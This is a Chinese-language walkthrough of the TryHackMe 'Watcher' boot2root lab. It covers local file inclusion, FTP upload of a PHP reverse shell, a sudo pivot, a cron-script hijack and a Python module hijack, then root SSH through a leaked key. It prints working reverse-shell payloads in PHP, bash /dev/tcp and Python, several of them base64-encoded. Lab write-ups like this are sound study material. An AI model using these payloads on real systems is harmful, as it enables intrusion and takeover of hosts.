# Watcher

一台利用 Web 漏洞利用以及一些常见权限提升技术的 boot2root Linux 机器。

---

本来根据前辈的经验，我学习他们一天windows一天linux，但是很可惜tryhackme的windows标签的机器有点少，有点不太够做的样子

---

## 端口扫描

循例 nmap扫：

    21/tcp open  ftp
    22/tcp open  ssh
    80/tcp open  http

## FTP 枚举

尝试anonymous访问ftp:

    ┌──(root🐦kali)-[/home/sugobet]
    └─# ftp anonymous@10.10.109.194
    Connected to 10.10.109.194.
    220 (vsFTPd 3.0.3)
    331 Please specify the password.
    Password: 
    530 Login incorrect.
    ftp: Login failed
    ftp> ls
    530 Please login with USER and PASS.
    530 Please login with USER and PASS.

失败

## Web信息收集

查看web，同时gobuster扫一波目录：

    ┌──(root🐦kali)-[/home/sugobet]
    └─# gobuster dir --url http://10.10.109.194/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

扫描结果：

    /css                  (Status: 301) [Size: 312] [--> http://10.10.109.194/css/]
    /images               (Status: 301) [Size: 315] [--> http://10.10.109.194/images/]
    /index.php            (Status: 200) [Size: 4826]
    /robots.txt           (Status: 200) [Size: 69]

robots.txt内容：

    User-agent: *
    Allow: /flag_1.txt
    Allow: /secret_file_do_not_read.txt

/flag1.txt是flag，/secret_file_do_not_read.txt无权访问

## LFI

我们在主页上随便点击一个文章，发现url不对劲：

    http://10.10.109.194/post.php?post=striped.php

估计是本地文件包含

尝试在这里访问刚刚无权访问的/secret_file_do_not_read.txt：

    http://10.10.109.194/post.php?post=secret_file_do_not_read.txt

成功越权访问：

    Hi Mat, The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files. Will ---------- ftpuser:giveme*****777

拿着这组凭据去登录ftp

    ┌──(root🐦kali)-[/home/sugobet]
    └─# ftp ftpuser@10.10.109.194  
    Connected to 10.10.109.194.
    220 (vsFTPd 3.0.3)
    331 Please specify the password.
    Password: 
    230 Login successful.
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> ls
    229 Entering Extended Passive Mode (|||41610|)
    150 Here comes the directory listing.
    drwxr-xr-x    2 1001     1001         4096 Dec 03  2020 files
    -rw-r--r--    1 0        0              21 Dec 03  2020 flag_2.txt

files文件夹下都没有，但是我发现files的所有者uid是1001

    drwxr-xr-x    2 1001     1001         4096 Dec 03  2020 files

我们通过刚刚的LFI查询/etc/passwd:

    http://10.10.109.194/post.php?post=../../../../../../../../../etc/passwd

    ftpuser:x:1001:1001:,,,:/home/ftpuser:/usr/sbin/nologin

该账户无法登录ssh

回看刚刚那句话：

    Hi Mat, The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files. Will

尝试在ftp的/files/上传文件：

    ftp> put ./test1.txt 
    local: ./test1.txt remote: ./test1.txt
    229 Entering Extended Passive Mode (|||44865|)
    150 Ok to send data.
    100% |****************************************************************************************************************************************|  6560        2.66 MiB/s    00:00 ETA
    226 Transfer complete.
    6560 bytes sent in 00:00 (10.23 KiB/s)

## Reverse shell

可以上传，利用LFI尝试查看刚刚上传的文件：

    view-source:http://10.10.109.194/post.php?post=../../../../../../../../../home/ftpuser/ftp/files/test1.txt

可以读取到文件内容

由于在正常的情况下，php文件能够被它执行：

    http://10.10.109.194/post.php?post=striped.php

故利用php来reverse shell

上传php reverse shell:

    <?php
    $sock=fsockopen("10.14.39.48",8888);$proc=proc_open("/bin/bash -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
    ?>

也可使用msfvenom生成，playload: php/reverse_php

将shellcode上传files/：

    ftp> put ./linux-tools_and_exp/rev_she11.php ./rev_she11.php

打开nc监听：

    nc -vlnp 8888

访问shellcode：

    view-source:http://10.10.109.194/post.php?post=../../../../../../../../../home/ftpuser/ftp/files/rev_she11.php

成功getshell

升级shell:

    python3 -c "import pty;pty.spawn('/bin/bash')"

flag3:

    www-data@watcher:/var/www/html/more_secrets_a9f10a$ ls -la
    ls -la
    total 12
    drwxr-xr-x 2 root root 4096 Dec  3  2020 .
    drwxr-xr-x 5 root root 4096 Dec  3  2020 ..
    -rw-r--r-- 1 root root   21 Dec  3  2020 flag_3.txt
    www-data@watcher:/var/www/html/more_secrets_a9f10a$ cat flag_3.txt

## 横向移动 - sudo -l

sudo -l发现当前用户可以无需密码以toby执行任何命令：

    User www-data may run the following commands on watcher:
    (toby) NOPASSWD: ALL

    www-data@watcher:/home$ sudo -u toby bash
    sudo -u toby bash
    toby@watcher:/home$ id
    id
    uid=1003(toby) gid=1003(toby) groups=1003(toby)

flag4:

    toby@watcher:/home$ cd ./toby
    cd ./toby
    toby@watcher:~$ ls -la
    ls -la
    total 44
    drwxr-xr-x 6 toby toby 4096 Dec 12  2020 .
    drwxr-xr-x 6 root root 4096 Dec  3  2020 ..
    lrwxrwxrwx 1 root root    9 Dec  3  2020 .bash_history -> /dev/null
    -rw-r--r-- 1 toby toby  220 Dec  3  2020 .bash_logout
    -rw-r--r-- 1 toby toby 3771 Dec  3  2020 .bashrc
    drwx------ 2 toby toby 4096 Dec  3  2020 .cache
    drwx------ 3 toby toby 4096 Dec  3  2020 .gnupg
    drwxrwxr-x 3 toby toby 4096 Dec  3  2020 .local
    -rw-r--r-- 1 toby toby  807 Dec  3  2020 .profile
    -rw------- 1 toby toby   21 Dec  3  2020 flag_4.txt
    drwxrwxr-x 2 toby toby 4096 Dec  3  2020 jobs
    -rw-r--r-- 1 mat  mat    89 Dec 12  2020 note.txt
    toby@watcher:~$ cat ./flag_4.txt
    cat ./flag_4.txt

## 横向移动2 - cron job

读取note.txt：

    Hi Toby,

    I've got the cron jobs set up now so don't worry about getting that done.

    Mat

查看crontab:

    cat /etc/crontab

    */1 * * * * mat /home/toby/jobs/cow.sh

查看该文件权限：

    -rwxr-xr-x 1 toby toby   46 Dec  3  2020 cow.sh

很幸运，toby是文件所有者，我们直接修改该脚本进行reverse shell

攻击机创建一个test1.txt并加入内容：

    #!/bin/bash
    /bin/bash -i >& /dev/tcp/10.14.39.48/9999 0>&1

将该文件内容base64编码

    ┌──(root🐦kali)-[/home/sugobet]
    └─# base64 ./test1.txt                                              
    IyEvYmluL2Jhc2gKL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjE0LjM5LjQ4Lzk5OTkgMD4m
    MQo=

在目标解码该base64字符串并写入cow.sh：

    toby@watcher:~/jobs$ echo "IyEvYmluL2Jhc2gKL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjE0LjM5LjQ4Lzk5OTkgMD4mMQo=" | base64 -d > ./cow.sh

开启nc监听，静等一小会，成功移动到mat

flag5:

    mat@watcher:~$ cat ./flag_5.txt

## 横向移动3 - python

查看note.txt:

    mat@watcher:~$ cat ./note.txt
    cat ./note.txt
    Hi Mat,

    I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

    Will

sudo -l:

    User mat may run the following commands on watcher:
        (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *

will_script.py:

    import os
    import sys
    from cmd import get_command

    cmd = get_command(sys.argv[1])

    whitelist = ["ls -lah", "id", "cat /etc/passwd"]

    if cmd not in whitelist:
        print("Invalid command!")
        exit()

    os.system(cmd)

cmd.py:

    def get_command(num):
        if(num == "1"):
            return "ls -lah"
        if(num == "2"):
            return "id"
        if(num == "3"):
            return "cat /etc/passwd"

我们可以修改python环境变量，然后创建一个cmd模块并创建get_command函数，里面是我们编写的代码：

    export PYTHONPATH=......$PYTHONPATH

当will_script运行时，将会先从我们设置的目录下查找我们编写的cmd模块。

当然我们现在并没有必要这样做，因为：

    -rw-r--r-- 1 mat  mat   133 Dec  3  2020 cmd.py

我们是文件所有者，我们可以编辑该文件

首先在攻击机上创建文件test1.txt并添加内容：

    def get_command(num):
        import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.39.48",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")


将其base64

然后在目标解码并写入cmd.py

    mat@watcher:~/scripts$ echo "<base64 code>" | base64 -d > ./cmd.py

开启nc监听，然后sudo执行wil_script.py：

    mat@watcher:~/scripts$ sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py hack

成功移动到will

    will@watcher:~/scripts$ cd /home/will
    cd /home/will
    will@watcher:/home/will$ ls -la
    ls -la
    total 36
    drwxr-xr-x 5 will will 4096 Dec  3  2020 .
    drwxr-xr-x 6 root root 4096 Dec  3  2020 ..
    lrwxrwxrwx 1 will will    9 Dec  3  2020 .bash_history -> /dev/null
    -rw-r--r-- 1 will will  220 Dec  3  2020 .bash_logout
    -rw-r--r-- 1 will will 3771 Dec  3  2020 .bashrc
    drwx------ 2 will will 4096 Dec  3  2020 .cache
    drwxr-x--- 3 will will 4096 Dec  3  2020 .config
    -rw------- 1 will will   41 Dec  3  2020 flag_6.txt
    drwx------ 3 will will 4096 Dec  3  2020 .gnupg
    -rw-r--r-- 1 will will  807 Dec  3  2020 .profile
    -rw-r--r-- 1 will will    0 Dec  3  2020 .sudo_as_admin_successful
    will@watcher:/home/will$ cat ./flag_6.txt

## getroot - ssh私钥暴露

如果刚刚认真检索目标上的文件的话，那么你一定找到了/opt/backups，该文件夹允许adm组的成员访问。

    will@watcher:~$ id
    id
    uid=1000(will) gid=1000(will) groups=1000(will),4(adm)

现在我们有权访问

    will@watcher:~$ ls -la /opt/backups
    ls -la /opt/backups
    total 12
    drwxrwx--- 2 root adm  4096 Dec  3  2020 .
    drwxr-xr-x 3 root root 4096 Dec  3  2020 ..
    -rw-rw---- 1 root adm  2270 Dec  3  2020 key.b64

查看key.b64是base64编码的东西，解码：

    will@watcher:~$ cat /opt/backups/key.b64 | base64 -d

我们得到ssh私钥，将其保存到攻击机的test1.txt

由于我们不确定这是哪个用户的私钥，我们通过/etc/passwd看看还有哪个用户：

    cat /etc/passwd | grep home
    syslog:x:102:106::/home/syslog:/usr/sbin/nologin
    will:x:1000:1000:will:/home/will:/bin/bash
    ftpuser:x:1001:1001:,,,:/home/ftpuser:/usr/sbin/nologin
    mat:x:1002:1002:,#,,:/home/mat:/bin/bash
    toby:x:1003:1003:,,,:/home/toby:/bin/bash

基本上除了root已经没有其他合适的人选了

尝试使用该私钥登录root：

    ┌──(root🐦kali)-[/home/sugobet]
    └─# chmod 400 ./test1.txt

    ┌──(root🐦kali)-[/home/sugobet]
    └─# ssh root@10.10.109.194 -i ./test1.txt

很幸运，该私钥没有设置密码，因此我们登录root成功

    root@watcher:~# ls -la /root
    total 40
    drwx------  6 root root 4096 Dec  3  2020 .
    drwxr-xr-x 24 root root 4096 Dec 12  2020 ..
    lrwxrwxrwx  1 root root    9 Dec  3  2020 .bash_history -> /dev/null
    -rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
    drwx------  2 root root 4096 Dec  3  2020 .cache
    -rw-r--r--  1 root root   31 Dec  3  2020 flag_7.txt
    drwx------  3 root root 4096 Dec  3  2020 .gnupg
    drwxr-xr-x  3 root root 4096 Dec  3  2020 .local
    -rw-r--r--  1 root root  148 Aug 17  2015 .profile
    -rw-r--r--  1 root root   66 Dec  3  2020 .selected_editor
    drwx------  2 root root 4096 Dec  3  2020 .ssh
    root@watcher:~# cat /root/flag_7.txt

## 结束

整体来说还是非常简单的，基本没有难的点，考横向移动比较多，但都是非常非常基础的点，稍微有点无聊
